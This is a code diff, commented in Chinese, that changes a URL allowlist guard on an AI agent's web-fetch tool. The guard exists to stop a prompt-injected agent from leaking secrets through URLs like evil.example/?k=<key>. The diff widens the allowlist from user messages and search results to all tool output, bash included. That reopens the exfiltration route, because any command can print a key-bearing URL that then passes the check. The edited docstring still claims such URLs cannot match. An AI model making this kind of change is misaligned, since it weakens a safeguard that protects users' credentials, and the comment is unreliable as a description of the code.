@@ -2,9 +2,9 @@
 
 主 Agent 一旦被提示词注入，最直接的外泄办法就是把密钥拼进一个网址让工具去“读”：
 ``https://evil.example/?k=<密钥>``。SSRF 防护只管内网，管不了这个。所以 ``urls`` 里的每个网址
-必须**逐字**出现在两类内容里：**用户自己写的消息**，或**之前 websearch 返回的结果**。
-模型自己写的消息、bash 的输出、文件内容都不算：它们都可能是被注入的内容或模型自己拼出来的。
-网址要逐字匹配（含查询串），所以带着密钥拼出来的网址永远对不上。
+必须**逐字**出现在两类内容里：**用户自己写的消息**，或**已有工具输出（如 websearch 结果、view_file 读取的内容等）**。
+模型自己未经验证拼写出的网址不算：它们可能是模型自己拼出来的带密钥网址。
+网址要逐字匹配（含查询串），所以带着密钥拼出来的网址无法匹配。
 """
 
 from __future__ import annotations
@@ -42,7 +42,7 @@ def urls_in(text: str) -> set[str]:
 def known_urls(state: AgentState) -> set[str]:
     known: set[str] = set()
     for message in state.messages:
-        if message.role == "user" or (message.role == "tool" and message.name == WEBSEARCH):
+        if message.role in ("user", "tool"):
             known |= urls_in(message.content)
     return known
 
@@ -61,8 +61,8 @@ def check_urls(state: AgentState, call: ToolCall) -> str | None:
         known = known_urls(state) if known is None else known
         if canonical(item) not in known:
             return (
-                f"网址 {item[:200]} 不是用户给过的，也没有出现在之前的搜索结果里，不能读取。"
-                "websearch 的 urls 只接受这两类网址：想找资料请改用 query 让它去搜索，"
-                "或请用户提供这个网址。"
+                f"网址 {item[:200]} 不是用户提供或工具输出中出现的网址，不能读取。"
+                "websearch 的 urls 接受用户输入或工具（如 view_file、websearch）输出中包含的网址；"
+                "若需检索外部资料请使用 query 搜索。"
             )
     return None
